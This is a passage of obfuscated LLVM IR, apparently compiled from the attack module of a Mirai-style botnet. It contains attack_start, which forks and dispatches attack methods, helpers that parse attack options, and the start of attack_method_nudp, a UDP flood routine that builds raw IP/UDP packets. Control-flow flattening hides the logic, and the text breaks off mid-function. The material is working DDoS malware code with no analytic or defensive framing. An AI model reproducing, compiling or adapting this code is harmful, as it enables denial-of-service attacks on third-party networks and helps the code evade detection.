; <label>:219:                                    ; preds = %loopEntry
  %220 = load i32, i32* %5, align 4
  %221 = add nsw i32 %220, 1
  store i32 %221, i32* %5, align 4
  store i32 585518308, i32* %switchVar
  br label %loopEnd

; <label>:222:                                    ; preds = %loopEntry
  store i32 -1146484641, i32* %switchVar
  br label %loopEnd

; <label>:223:                                    ; preds = %loopEntry
  %224 = call i32* @__errno_location() #8
  store i32 0, i32* %224, align 4
  %225 = load i32, i32* %6, align 4
  %226 = load i8, i8* %7, align 1
  %227 = load i8, i8* %8, align 1
  %228 = load %struct.attack_target*, %struct.attack_target** %10, align 8
  %229 = load i8, i8* %9, align 1
  %230 = load %struct.attack_option*, %struct.attack_option** %11, align 8
  call void @attack_start(i32 %225, i8 zeroext %226, i8 zeroext %227, %struct.attack_target* %228, i8 zeroext %229, %struct.attack_option* %230)
  store i32 1367961110, i32* %switchVar
  br label %loopEnd

; <label>:231:                                    ; preds = %loopEntry
  %232 = load %struct.attack_target*, %struct.attack_target** %10, align 8
  %233 = icmp ne %struct.attack_target* %232, null
  %234 = select i1 %233, i32 -1051355405, i32 668717369
  store i32 %234, i32* %switchVar
  br label %loopEnd

; <label>:235:                                    ; preds = %loopEntry
  %236 = load %struct.attack_target*, %struct.attack_target** %10, align 8
  %237 = bitcast %struct.attack_target* %236 to i8*
  call void @free(i8* %237) #7
  store i32 668717369, i32* %switchVar
  br label %loopEnd

; <label>:238:                                    ; preds = %loopEntry
  %239 = load %struct.attack_option*, %struct.attack_option** %11, align 8
  %240 = icmp ne %struct.attack_option* %239, null
  %241 = select i1 %240, i32 1362871777, i32 1210571261
  store i32 %241, i32* %switchVar
  br label %loopEnd

; <label>:242:                                    ; preds = %loopEntry
  %243 = load %struct.attack_option*, %struct.attack_option** %11, align 8
  %244 = load i8, i8* %9, align 1
  %245 = zext i8 %244 to i32
  call void @free_opts(%struct.attack_option* %243, i32 %245)
  store i32 1210571261, i32* %switchVar
  br label %loopEnd

; <label>:246:                                    ; preds = %loopEntry
  ret void

loopEnd:                                          ; preds = %242, %238, %235, %231, %223, %222, %219, %190, %189, %176, %175, %158, %157, %152, %146, %141, %129, %128, %123, %120, %78, %72, %67, %66, %58, %57, %45, %44, %33, %32, %18, %17, %first, %switchDefault
  br label %loopEntry
}

; Function Attrs: nounwind readnone
declare i32 @ntohl(i32) #2

declare void @util_memcpy(i8*, i8*, i32) #3

; Function Attrs: nounwind readnone
declare i32* @__errno_location() #2

; Function Attrs: noinline nounwind uwtable
define void @attack_start(i32, i8 zeroext, i8 zeroext, %struct.attack_target*, i8 zeroext, %struct.attack_option*) #0 {
  %.reg2mem = alloca i32
  %7 = alloca i32, align 4
  %8 = alloca i8, align 1
  %9 = alloca i8, align 1
  %10 = alloca %struct.attack_target*, align 8
  %11 = alloca i8, align 1
  %12 = alloca %struct.attack_option*, align 8
  %13 = alloca i32, align 4
  %14 = alloca i32, align 4
  %15 = alloca i32, align 4
  store i32 %0, i32* %7, align 4
  store i8 %1, i8* %8, align 1
  store i8 %2, i8* %9, align 1
  store %struct.attack_target* %3, %struct.attack_target** %10, align 8
  store i8 %4, i8* %11, align 1
  store %struct.attack_option* %5, %struct.attack_option** %12, align 8
  %16 = call i32 @fork() #7
  store i32 %16, i32* %13, align 4
  %17 = load i32, i32* %13, align 4
  store i32 %17, i32* %.reg2mem
  %switchVar = alloca i32
  store i32 -798028510, i32* %switchVar
  br label %loopEntry

loopEntry:                                        ; preds = %loopEnd, %6
  %switchVar1 = load i32, i32* %switchVar
  switch i32 %switchVar1, label %switchDefault [
    i32 -798028510, label %first
    i32 653174187, label %20
    i32 -905837517, label %24
    i32 -2093367962, label %25
    i32 1466881677, label %30
    i32 -793585159, label %31
    i32 1068571290, label %35
    i32 -210506840, label %40
    i32 845963772, label %41
    i32 1600851735, label %47
    i32 1954522061, label %60
    i32 694414461, label %72
    i32 1455047114, label %73
    i32 449968445, label %76
  ]

switchDefault:                                    ; preds = %loopEntry
  br label %loopEnd

first:                                            ; preds = %loopEntry
  %.reload = load volatile i32, i32* %.reg2mem
  %18 = icmp eq i32 %.reload, -1
  %19 = select i1 %18, i32 -905837517, i32 653174187
  store i32 %19, i32* %switchVar
  br label %loopEnd

; <label>:20:                                     ; preds = %loopEntry
  %21 = load i32, i32* %13, align 4
  %22 = icmp sgt i32 %21, 0
  %23 = select i1 %22, i32 -905837517, i32 -2093367962
  store i32 %23, i32* %switchVar
  br label %loopEnd

; <label>:24:                                     ; preds = %loopEntry
  ret void

; <label>:25:                                     ; preds = %loopEntry
  %26 = call i32 @fork() #7
  store i32 %26, i32* %14, align 4
  %27 = load i32, i32* %14, align 4
  %28 = icmp eq i32 %27, -1
  %29 = select i1 %28, i32 1466881677, i32 -793585159
  store i32 %29, i32* %switchVar
  br label %loopEnd

; <label>:30:                                     ; preds = %loopEntry
  call void @exit(i32 0) #9
  unreachable

; <label>:31:                                     ; preds = %loopEntry
  %32 = load i32, i32* %14, align 4
  %33 = icmp eq i32 %32, 0
  %34 = select i1 %33, i32 1068571290, i32 -210506840
  store i32 %34, i32* %switchVar
  br label %loopEnd

; <label>:35:                                     ; preds = %loopEntry
  %36 = load i32, i32* %7, align 4
  %37 = call i32 @sleep(i32 %36)
  %38 = call i32 @getppid() #7
  %39 = call i32 @kill(i32 %38, i32 9) #7
  call void @exit(i32 0) #9
  unreachable

; <label>:40:                                     ; preds = %loopEntry
  store i32 0, i32* %15, align 4
  store i32 845963772, i32* %switchVar
  br label %loopEnd

; <label>:41:                                     ; preds = %loopEntry
  %42 = load i32, i32* %15, align 4
  %43 = load i8, i8* @methods_len, align 1
  %44 = zext i8 %43 to i32
  %45 = icmp slt i32 %42, %44
  %46 = select i1 %45, i32 1600851735, i32 449968445
  store i32 %46, i32* %switchVar
  br label %loopEnd

; <label>:47:                                     ; preds = %loopEntry
  %48 = load %struct.attack_method**, %struct.attack_method*** @methods, align 8
  %49 = load i32, i32* %15, align 4
  %50 = sext i32 %49 to i64
  %51 = getelementptr inbounds %struct.attack_method*, %struct.attack_method** %48, i64 %50
  %52 = load %struct.attack_method*, %struct.attack_method** %51, align 8
  %53 = getelementptr inbounds %struct.attack_method, %struct.attack_method* %52, i32 0, i32 1
  %54 = load i8, i8* %53, align 8
  %55 = zext i8 %54 to i32
  %56 = load i8, i8* %8, align 1
  %57 = zext i8 %56 to i32
  %58 = icmp eq i32 %55, %57
  %59 = select i1 %58, i32 1954522061, i32 694414461
  store i32 %59, i32* %switchVar
  br label %loopEnd

; <label>:60:                                     ; preds = %loopEntry
  %61 = load %struct.attack_method**, %struct.attack_method*** @methods, align 8
  %62 = load i32, i32* %15, align 4
  %63 = sext i32 %62 to i64
  %64 = getelementptr inbounds %struct.attack_method*, %struct.attack_method** %61, i64 %63
  %65 = load %struct.attack_method*, %struct.attack_method** %64, align 8
  %66 = getelementptr inbounds %struct.attack_method, %struct.attack_method* %65, i32 0, i32 0
  %67 = load void (i8, %struct.attack_target*, i8, %struct.attack_option*)*, void (i8, %struct.attack_target*, i8, %struct.attack_option*)** %66, align 8
  %68 = load i8, i8* %9, align 1
  %69 = load %struct.attack_target*, %struct.attack_target** %10, align 8
  %70 = load i8, i8* %11, align 1
  %71 = load %struct.attack_option*, %struct.attack_option** %12, align 8
  call void %67(i8 zeroext %68, %struct.attack_target* %69, i8 zeroext %70, %struct.attack_option* %71)
  store i32 449968445, i32* %switchVar
  br label %loopEnd

; <label>:72:                                     ; preds = %loopEntry
  store i32 1455047114, i32* %switchVar
  br label %loopEnd

; <label>:73:                                     ; preds = %loopEntry
  %74 = load i32, i32* %15, align 4
  %75 = add nsw i32 %74, 1
  store i32 %75, i32* %15, align 4
  store i32 845963772, i32* %switchVar
  br label %loopEnd

; <label>:76:                                     ; preds = %loopEntry
  call void @exit(i32 0) #9
  unreachable

loopEnd:                                          ; preds = %73, %72, %60, %47, %41, %40, %31, %25, %20, %first, %switchDefault
  br label %loopEntry
}

; Function Attrs: nounwind
declare void @free(i8*) #1

; Function Attrs: noinline nounwind uwtable
define internal void @free_opts(%struct.attack_option*, i32) #0 {
  %.reg2mem = alloca %struct.attack_option*
  %3 = alloca %struct.attack_option*, align 8
  %4 = alloca i32, align 4
  %5 = alloca i32, align 4
  store %struct.attack_option* %0, %struct.attack_option** %3, align 8
  store i32 %1, i32* %4, align 4
  %6 = load %struct.attack_option*, %struct.attack_option** %3, align 8
  store %struct.attack_option* %6, %struct.attack_option** %.reg2mem
  %switchVar = alloca i32
  store i32 -241838125, i32* %switchVar
  br label %loopEntry

loopEntry:                                        ; preds = %loopEnd, %2
  %switchVar1 = load i32, i32* %switchVar
  switch i32 %switchVar1, label %switchDefault [
    i32 -241838125, label %first
    i32 786457807, label %9
    i32 -1051020293, label %10
    i32 1165167759, label %11
    i32 590582096, label %16
    i32 963012085, label %25
    i32 -1242637109, label %32
    i32 47332022, label %33
    i32 -928786061, label %36
    i32 -1992981501, label %39
  ]

switchDefault:                                    ; preds = %loopEntry
  br label %loopEnd

first:                                            ; preds = %loopEntry
  %.reload = load volatile %struct.attack_option*, %struct.attack_option** %.reg2mem
  %7 = icmp eq %struct.attack_option* %.reload, null
  %8 = select i1 %7, i32 786457807, i32 -1051020293
  store i32 %8, i32* %switchVar
  br label %loopEnd

; <label>:9:                                      ; preds = %loopEntry
  store i32 -1992981501, i32* %switchVar
  br label %loopEnd

; <label>:10:                                     ; preds = %loopEntry
  store i32 0, i32* %5, align 4
  store i32 1165167759, i32* %switchVar
  br label %loopEnd

; <label>:11:                                     ; preds = %loopEntry
  %12 = load i32, i32* %5, align 4
  %13 = load i32, i32* %4, align 4
  %14 = icmp slt i32 %12, %13
  %15 = select i1 %14, i32 590582096, i32 -928786061
  store i32 %15, i32* %switchVar
  br label %loopEnd

; <label>:16:                                     ; preds = %loopEntry
  %17 = load %struct.attack_option*, %struct.attack_option** %3, align 8
  %18 = load i32, i32* %5, align 4
  %19 = sext i32 %18 to i64
  %20 = getelementptr inbounds %struct.attack_option, %struct.attack_option* %17, i64 %19
  %21 = getelementptr inbounds %struct.attack_option, %struct.attack_option* %20, i32 0, i32 0
  %22 = load i8*, i8** %21, align 8
  %23 = icmp ne i8* %22, null
  %24 = select i1 %23, i32 963012085, i32 -1242637109
  store i32 %24, i32* %switchVar
  br label %loopEnd

; <label>:25:                                     ; preds = %loopEntry
  %26 = load %struct.attack_option*, %struct.attack_option** %3, align 8
  %27 = load i32, i32* %5, align 4
  %28 = sext i32 %27 to i64
  %29 = getelementptr inbounds %struct.attack_option, %struct.attack_option* %26, i64 %28
  %30 = getelementptr inbounds %struct.attack_option, %struct.attack_option* %29, i32 0, i32 0
  %31 = load i8*, i8** %30, align 8
  call void @free(i8* %31) #7
  store i32 -1242637109, i32* %switchVar
  br label %loopEnd

; <label>:32:                                     ; preds = %loopEntry
  store i32 47332022, i32* %switchVar
  br label %loopEnd

; <label>:33:                                     ; preds = %loopEntry
  %34 = load i32, i32* %5, align 4
  %35 = add nsw i32 %34, 1
  store i32 %35, i32* %5, align 4
  store i32 1165167759, i32* %switchVar
  br label %loopEnd

; <label>:36:                                     ; preds = %loopEntry
  %37 = load %struct.attack_option*, %struct.attack_option** %3, align 8
  %38 = bitcast %struct.attack_option* %37 to i8*
  call void @free(i8* %38) #7
  store i32 -1992981501, i32* %switchVar
  br label %loopEnd

; <label>:39:                                     ; preds = %loopEntry
  ret void

loopEnd:                                          ; preds = %36, %33, %32, %25, %16, %11, %10, %9, %first, %switchDefault
  br label %loopEntry
}

; Function Attrs: nounwind
declare i32 @fork() #1

; Function Attrs: noreturn nounwind
declare void @exit(i32) #4

declare i32 @sleep(i32) #3

; Function Attrs: nounwind
declare i32 @getppid() #1

; Function Attrs: noinline nounwind uwtable
define i8* @attack_get_opt_str(i8 zeroext, %struct.attack_option*, i8 zeroext, i8*) #0 {
  %5 = alloca i8*, align 8
  %6 = alloca i8, align 1
  %7 = alloca %struct.attack_option*, align 8
  %8 = alloca i8, align 1
  %9 = alloca i8*, align 8
  %10 = alloca i32, align 4
  store i8 %0, i8* %6, align 1
  store %struct.attack_option* %1, %struct.attack_option** %7, align 8
  store i8 %2, i8* %8, align 1
  store i8* %3, i8** %9, align 8
  store i32 0, i32* %10, align 4
  %switchVar = alloca i32
  store i32 2144817215, i32* %switchVar
  br label %loopEntry

loopEntry:                                        ; preds = %loopEnd, %4
  %switchVar1 = load i32, i32* %switchVar
  switch i32 %switchVar1, label %switchDefault [
    i32 2144817215, label %11
    i32 1029452846, label %17
    i32 -809327068, label %29
    i32 256319559, label %36
    i32 1390446188, label %37
    i32 -1795366539, label %40
    i32 -708063569, label %42
  ]

switchDefault:                                    ; preds = %loopEntry
  br label %loopEnd

; <label>:11:                                     ; preds = %loopEntry
  %12 = load i32, i32* %10, align 4
  %13 = load i8, i8* %6, align 1
  %14 = zext i8 %13 to i32
  %15 = icmp slt i32 %12, %14
  %16 = select i1 %15, i32 1029452846, i32 -1795366539
  store i32 %16, i32* %switchVar
  br label %loopEnd

; <label>:17:                                     ; preds = %loopEntry
  %18 = load %struct.attack_option*, %struct.attack_option** %7, align 8
  %19 = load i32, i32* %10, align 4
  %20 = sext i32 %19 to i64
  %21 = getelementptr inbounds %struct.attack_option, %struct.attack_option* %18, i64 %20
  %22 = getelementptr inbounds %struct.attack_option, %struct.attack_option* %21, i32 0, i32 1
  %23 = load i8, i8* %22, align 8
  %24 = zext i8 %23 to i32
  %25 = load i8, i8* %8, align 1
  %26 = zext i8 %25 to i32
  %27 = icmp eq i32 %24, %26
  %28 = select i1 %27, i32 -809327068, i32 256319559
  store i32 %28, i32* %switchVar
  br label %loopEnd

; <label>:29:                                     ; preds = %loopEntry
  %30 = load %struct.attack_option*, %struct.attack_option** %7, align 8
  %31 = load i32, i32* %10, align 4
  %32 = sext i32 %31 to i64
  %33 = getelementptr inbounds %struct.attack_option, %struct.attack_option* %30, i64 %32
  %34 = getelementptr inbounds %struct.attack_option, %struct.attack_option* %33, i32 0, i32 0
  %35 = load i8*, i8** %34, align 8
  store i8* %35, i8** %5, align 8
  store i32 -708063569, i32* %switchVar
  br label %loopEnd

; <label>:36:                                     ; preds = %loopEntry
  store i32 1390446188, i32* %switchVar
  br label %loopEnd

; <label>:37:                                     ; preds = %loopEntry
  %38 = load i32, i32* %10, align 4
  %39 = add nsw i32 %38, 1
  store i32 %39, i32* %10, align 4
  store i32 2144817215, i32* %switchVar
  br label %loopEnd

; <label>:40:                                     ; preds = %loopEntry
  %41 = load i8*, i8** %9, align 8
  store i8* %41, i8** %5, align 8
  store i32 -708063569, i32* %switchVar
  br label %loopEnd

; <label>:42:                                     ; preds = %loopEntry
  %43 = load i8*, i8** %5, align 8
  ret i8* %43

loopEnd:                                          ; preds = %40, %37, %36, %29, %17, %11, %switchDefault
  br label %loopEntry
}

; Function Attrs: noinline nounwind uwtable
define i32 @attack_get_opt_int(i8 zeroext, %struct.attack_option*, i8 zeroext, i32) #0 {
  %.reg2mem = alloca i8*
  %5 = alloca i32, align 4
  %6 = alloca i8, align 1
  %7 = alloca %struct.attack_option*, align 8
  %8 = alloca i8, align 1
  %9 = alloca i32, align 4
  %10 = alloca i8*, align 8
  store i8 %0, i8* %6, align 1
  store %struct.attack_option* %1, %struct.attack_option** %7, align 8
  store i8 %2, i8* %8, align 1
  store i32 %3, i32* %9, align 4
  %11 = load i8, i8* %6, align 1
  %12 = load %struct.attack_option*, %struct.attack_option** %7, align 8
  %13 = load i8, i8* %8, align 1
  %14 = call i8* @attack_get_opt_str(i8 zeroext %11, %struct.attack_option* %12, i8 zeroext %13, i8* null)
  store i8* %14, i8** %10, align 8
  %15 = load i8*, i8** %10, align 8
  store i8* %15, i8** %.reg2mem
  %switchVar = alloca i32
  store i32 642735631, i32* %switchVar
  br label %loopEntry

loopEntry:                                        ; preds = %loopEnd, %4
  %switchVar1 = load i32, i32* %switchVar
  switch i32 %switchVar1, label %switchDefault [
    i32 642735631, label %first
    i32 -2144400789, label %18
    i32 -1458763556, label %20
    i32 535234993, label %23
  ]

switchDefault:                                    ; preds = %loopEntry
  br label %loopEnd

first:                                            ; preds = %loopEntry
  %.reload = load volatile i8*, i8** %.reg2mem
  %16 = icmp eq i8* %.reload, null
  %17 = select i1 %16, i32 -2144400789, i32 -1458763556
  store i32 %17, i32* %switchVar
  br label %loopEnd

; <label>:18:                                     ; preds = %loopEntry
  %19 = load i32, i32* %9, align 4
  store i32 %19, i32* %5, align 4
  store i32 535234993, i32* %switchVar
  br label %loopEnd

; <label>:20:                                     ; preds = %loopEntry
  %21 = load i8*, i8** %10, align 8
  %22 = call i32 @util_atoi(i8* %21, i32 10)
  store i32 %22, i32* %5, align 4
  store i32 535234993, i32* %switchVar
  br label %loopEnd

; <label>:23:                                     ; preds = %loopEntry
  %24 = load i32, i32* %5, align 4
  ret i32 %24

loopEnd:                                          ; preds = %20, %18, %first, %switchDefault
  br label %loopEntry
}

declare i32 @util_atoi(i8*, i32) #3

; Function Attrs: noinline nounwind uwtable
define i32 @attack_get_opt_ip(i8 zeroext, %struct.attack_option*, i8 zeroext, i32) #0 {
  %.reg2mem = alloca i8*
  %5 = alloca i32, align 4
  %6 = alloca i8, align 1
  %7 = alloca %struct.attack_option*, align 8
  %8 = alloca i8, align 1
  %9 = alloca i32, align 4
  %10 = alloca i8*, align 8
  store i8 %0, i8* %6, align 1
  store %struct.attack_option* %1, %struct.attack_option** %7, align 8
  store i8 %2, i8* %8, align 1
  store i32 %3, i32* %9, align 4
  %11 = load i8, i8* %6, align 1
  %12 = load %struct.attack_option*, %struct.attack_option** %7, align 8
  %13 = load i8, i8* %8, align 1
  %14 = call i8* @attack_get_opt_str(i8 zeroext %11, %struct.attack_option* %12, i8 zeroext %13, i8* null)
  store i8* %14, i8** %10, align 8
  %15 = load i8*, i8** %10, align 8
  store i8* %15, i8** %.reg2mem
  %switchVar = alloca i32
  store i32 1196622678, i32* %switchVar
  br label %loopEntry

loopEntry:                                        ; preds = %loopEnd, %4
  %switchVar1 = load i32, i32* %switchVar
  switch i32 %switchVar1, label %switchDefault [
    i32 1196622678, label %first
    i32 -1323674319, label %18
    i32 973572516, label %20
    i32 -495930822, label %23
  ]

switchDefault:                                    ; preds = %loopEntry
  br label %loopEnd

first:                                            ; preds = %loopEntry
  %.reload = load volatile i8*, i8** %.reg2mem
  %16 = icmp eq i8* %.reload, null
  %17 = select i1 %16, i32 -1323674319, i32 973572516
  store i32 %17, i32* %switchVar
  br label %loopEnd

; <label>:18:                                     ; preds = %loopEntry
  %19 = load i32, i32* %9, align 4
  store i32 %19, i32* %5, align 4
  store i32 -495930822, i32* %switchVar
  br label %loopEnd

; <label>:20:                                     ; preds = %loopEntry
  %21 = load i8*, i8** %10, align 8
  %22 = call i32 @inet_addr(i8* %21) #7
  store i32 %22, i32* %5, align 4
  store i32 -495930822, i32* %switchVar
  br label %loopEnd

; <label>:23:                                     ; preds = %loopEntry
  %24 = load i32, i32* %5, align 4
  ret i32 %24

loopEnd:                                          ; preds = %20, %18, %first, %switchDefault
  br label %loopEntry
}

; Function Attrs: nounwind
declare i32 @inet_addr(i8*) #1

; Function Attrs: noinline nounwind uwtable
define void @attack_method_nudp(i8 zeroext, %struct.attack_target*, i8 zeroext, %struct.attack_option*) #0 {
  %.reg2mem = alloca i32
  %5 = alloca i8, align 1
  %6 = alloca %struct.attack_target*, align 8
  %7 = alloca i8, align 1
  %8 = alloca %struct.attack_option*, align 8
  %9 = alloca [22 x i8*], align 16
  %10 = alloca i32, align 4
  %11 = alloca i8**, align 8
  %12 = alloca i32*, align 8
  %13 = alloca i16, align 2
  %14 = alloca i16, align 2
  %15 = alloca i16, align 2
  %16 = alloca i8, align 1
  %17 = alloca %struct.sockaddr_in, align 4
  %18 = alloca %struct.iphdr*, align 8
  %19 = alloca %struct.udphdr*, align 8
  %20 = alloca i8*, align 8
  %21 = alloca %union.__CONST_SOCKADDR_ARG, align 8
  %22 = alloca %union.__CONST_SOCKADDR_ARG, align 8
  store i8 %0, i8* %5, align 1
  store %struct.attack_target* %1, %struct.attack_target** %6, align 8
  store i8 %2, i8* %7, align 1
  store %struct.attack_option* %3, %struct.attack_option** %8, align 8
  %23 = getelementptr inbounds [22 x i8*], [22 x i8*]* %9, i64 0, i64 0
  store i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.1, i32 0, i32 0), i8** %23, align 8
  %24 = getelementptr inbounds i8*, i8** %23, i64 1
  %25 = call signext i8 @random_hex()
  %26 = sext i8 %25 to i32
  %27 = call signext i8 @random_hex()
  %28 = sext i8 %27 to i32
  %29 = add nsw i32 %26, %28
  %30 = sext i32 %29 to i64
  %31 = getelementptr inbounds i8, i8* getelementptr inbounds ([31 x i8], [31 x i8]* @.str.2, i32 0, i32 0), i64 %30
  store i8* %31, i8** %24, align 8
  %32 = getelementptr inbounds i8*, i8** %24, i64 1
  %33 = call signext i8 @random_hex()
  %34 = sext i8 %33 to i32
  %35 = call signext i8 @random_hex()
  %36 = sext i8 %35 to i32
  %37 = add nsw i32 %34, %36
  %38 = sext i32 %37 to i64
  %39 = getelementptr inbounds i8, i8* getelementptr inbounds ([31 x i8], [31 x i8]* @.str.3, i32 0, i32 0), i64 %38
  store i8* %39, i8** %32, align 8
  %40 = getelementptr inbounds i8*, i8** %32, i64 1
  store i8* getelementptr inbounds ([41 x i8], [41 x i8]* @.str.4, i32 0, i32 0), i8** %40, align 8
  %41 = getelementptr inbounds i8*, i8** %40, i64 1
  store i8* getelementptr inbounds ([49 x i8], [49 x i8]* @.str.5, i32 0, i32 0), i8** %41, align 8
  %42 = getelementptr inbounds i8*, i8** %41, i64 1
  store i8* getelementptr inbounds ([31 x i8], [31 x i8]* @.str.3, i32 0, i32 0), i8** %42, align 8
  %43 = getelementptr inbounds i8*, i8** %42, i64 1
  %44 = call signext i8 @random_hex()
  %45 = sext i8 %44 to i32
  %46 = call signext i8 @random_hex()
  %47 = sext i8 %46 to i32
  %48 = add nsw i32 %45, %47
  %49 = call signext i8 @random_hex()
  %50 = sext i8 %49 to i32
  %51 = add nsw i32 %48, %50
  %52 = call signext i8 @random_hex()
  %53 = sext i8 %52 to i32
  %54 = add nsw i32 %51, %53
  %55 = call signext i8 @random_hex()
  %56 = sext i8 %55 to i32
  %57 = add nsw i32 %54, %56
  %58 = call signext i8 @random_hex()
  %59 = sext i8 %58 to i32
  %60 = add nsw i32 %57, %59
  %61 = call signext i8 @random_hex()
  %62 = sext i8 %61 to i32
  %63 = add nsw i32 %60, %62
  %64 = call signext i8 @random_hex()
  %65 = sext i8 %64 to i32
  %66 = add nsw i32 %63, %65
  %67 = call signext i8 @random_hex()
  %68 = sext i8 %67 to i32
  %69 = add nsw i32 %66, %68
  %70 = call signext i8 @random_hex()
  %71 = sext i8 %70 to i32
  %72 = add nsw i32 %69, %71
  %73 = call signext i8 @random_hex()
  %74 = sext i8 %73 to i32
  %75 = add nsw i32 %72, %74
  %76 = call signext i8 @random_hex()
  %77 = sext i8 %76 to i32
  %78 = add nsw i32 %75, %77
  %79 = call signext i8 @random_hex()
  %80 = sext i8 %79 to i32
  %81 = add nsw i32 %78, %80
  %82 = call signext i8 @random_hex()
  %83 = sext i8 %82 to i32
  %84 = add nsw i32 %81, %83
  %85 = sext i32 %84 to i64
  %86 = getelementptr inbounds i8, i8* getelementptr inbounds ([1 x i8], [1 x i8]* @.str.6, i32 0, i32 0), i64 %85
  store i8* %86, i8** %43, align 8
  %87 = getelementptr inbounds i8*, i8** %43, i64 1
  store i8* getelementptr inbounds ([61 x i8], [61 x i8]* @.str.7, i32 0, i32 0), i8** %87, align 8
  %88 = getelementptr inbounds i8*, i8** %87, i64 1
  store i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.8, i32 0, i32 0), i8** %88, align 8
  %89 = getelementptr inbounds i8*, i8** %88, i64 1
  store i8* getelementptr inbounds ([52 x i8], [52 x i8]* @.str.9, i32 0, i32 0), i8** %89, align 8
  %90 = getelementptr inbounds i8*, i8** %89, i64 1
  store i8* getelementptr inbounds ([54 x i8], [54 x i8]* @.str.10, i32 0, i32 0), i8** %90, align 8
  %91 = getelementptr inbounds i8*, i8** %90, i64 1
  store i8* getelementptr inbounds ([157 x i8], [157 x i8]* @.str.11, i32 0, i32 0), i8** %91, align 8
  %92 = getelementptr inbounds i8*, i8** %91, i64 1
  store i8* getelementptr inbounds ([25 x i8], [25 x i8]* @.str.12, i32 0, i32 0), i8** %92, align 8
  %93 = getelementptr inbounds i8*, i8** %92, i64 1
  store i8* getelementptr inbounds ([24 x i8], [24 x i8]* @.str.13, i32 0, i32 0), i8** %93, align 8
  %94 = getelementptr inbounds i8*, i8** %93, i64 1
  store i8* getelementptr inbounds ([31 x i8], [31 x i8]* @.str.14, i32 0, i32 0), i8** %94, align 8
  %95 = getelementptr inbounds i8*, i8** %94, i64 1
  store i8* getelementptr inbounds ([15 x i8], [15 x i8]* @.str.15, i32 0, i32 0), i8** %95, align 8
  %96 = getelementptr inbounds i8*, i8** %95, i64 1
  store i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.16, i32 0, i32 0), i8** %96, align 8
  %97 = getelementptr inbounds i8*, i8** %96, i64 1
  store i8* getelementptr inbounds ([31 x i8], [31 x i8]* @.str.17, i32 0, i32 0), i8** %97, align 8
  %98 = getelementptr inbounds i8*, i8** %97, i64 1
  store i8* getelementptr inbounds ([174 x i8], [174 x i8]* @.str.18, i32 0, i32 0), i8** %98, align 8
  %99 = getelementptr inbounds i8*, i8** %98, i64 1
  store i8* getelementptr inbounds ([47 x i8], [47 x i8]* @.str.19, i32 0, i32 0), i8** %99, align 8
  %100 = getelementptr inbounds i8*, i8** %99, i64 1
  store i8* getelementptr inbounds ([182 x i8], [182 x i8]* @.str.20, i32 0, i32 0), i8** %100, align 8
  %101 = getelementptr inbounds i8*, i8** %100, i64 1
  store i8* getelementptr inbounds ([163 x i8], [163 x i8]* @.str.21, i32 0, i32 0), i8** %101, align 8
  %102 = load i8, i8* %5, align 1
  %103 = zext i8 %102 to i64
  %104 = call noalias i8* @calloc(i64 %103, i64 8) #7
  %105 = bitcast i8* %104 to i8**
  store i8** %105, i8*** %11, align 8
  %106 = load i8, i8* %5, align 1
  %107 = zext i8 %106 to i64
  %108 = call noalias i8* @calloc(i64 %107, i64 4) #7
  %109 = bitcast i8* %108 to i32*
  store i32* %109, i32** %12, align 8
  %110 = load i8, i8* %7, align 1
  %111 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %112 = call i32 @attack_get_opt_int(i8 zeroext %110, %struct.attack_option* %111, i8 zeroext 7, i32 65535)
  %113 = trunc i32 %112 to i16
  store i16 %113, i16* %13, align 2
  %114 = load i8, i8* %7, align 1
  %115 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %116 = call i32 @attack_get_opt_int(i8 zeroext %114, %struct.attack_option* %115, i8 zeroext 6, i32 65535)
  %117 = trunc i32 %116 to i16
  store i16 %117, i16* %14, align 2
  %118 = load i8, i8* %7, align 1
  %119 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %120 = call i32 @attack_get_opt_int(i8 zeroext %118, %struct.attack_option* %119, i8 zeroext 0, i32 1024)
  %121 = trunc i32 %120 to i16
  store i16 %121, i16* %15, align 2
  %122 = load i8, i8* %7, align 1
  %123 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %124 = call i32 @attack_get_opt_int(i8 zeroext %122, %struct.attack_option* %123, i8 zeroext 1, i32 1)
  %125 = trunc i32 %124 to i8
  store i8 %125, i8* %16, align 1
  %126 = bitcast %struct.sockaddr_in* %17 to i8*
  call void @llvm.memset.p0i8.i64(i8* %126, i8 0, i64 16, i32 4, i1 false)
  %127 = load i16, i16* %14, align 2
  %128 = zext i16 %127 to i32
  store i32 %128, i32* %.reg2mem
  %switchVar = alloca i32
  store i32 -483083945, i32* %switchVar
  br label %loopEntry

loopEntry:                                        ; preds = %loopEnd, %4
  %switchVar1 = load i32, i32* %switchVar
  switch i32 %switchVar1, label %switchDefault [
    i32 -483083945, label %first
    i32 -1214297650, label %131
    i32 1837142115, label %134
    i32 2107304855, label %137
    i32 2103612964, label %138
    i32 843956999, label %144
    i32 1656016399, label %154
    i32 -214118905, label %163
    i32 -1476651714, label %172
    i32 522703673, label %180
    i32 -684187663, label %181
    i32 557105603, label %199
    i32 101938270, label %200
    i32 -556648802, label %210
    i32 -626597406, label %236
    i32 -1078126287, label %254
    i32 -1345079119, label %255
    i32 216914551, label %256
    i32 1089869152, label %259
    i32 1053063356, label %260
    i32 -830157538, label %261
    i32 2059749497, label %267
    i32 1017231818, label %284
    i32 968989821, label %287
  ]

switchDefault:                                    ; preds = %loopEntry
  br label %loopEnd

first:                                            ; preds = %loopEntry
  %.reload = load volatile i32, i32* %.reg2mem
  %129 = icmp eq i32 %.reload, 65535
  %130 = select i1 %129, i32 -1214297650, i32 1837142115
  store i32 %130, i32* %switchVar
  br label %loopEnd

; <label>:131:                                    ; preds = %loopEntry
  %132 = call i32 @rand_next()
  %133 = trunc i32 %132 to i16
  store i16 %133, i16* %14, align 2
  store i32 2107304855, i32* %switchVar
  br label %loopEnd

; <label>:134:                                    ; preds = %loopEntry
  %135 = load i16, i16* %14, align 2
  %136 = call zeroext i16 @htons(i16 zeroext %135) #8
  store i16 %136, i16* %14, align 2
  store i32 2107304855, i32* %switchVar
  br label %loopEnd

; <label>:137:                                    ; preds = %loopEntry
  store i32 0, i32* %10, align 4
  store i32 2103612964, i32* %switchVar
  br label %loopEnd

; <label>:138:                                    ; preds = %loopEntry
  %139 = load i32, i32* %10, align 4
  %140 = load i8, i8* %5, align 1
  %141 = zext i8 %140 to i32
  %142 = icmp slt i32 %139, %141
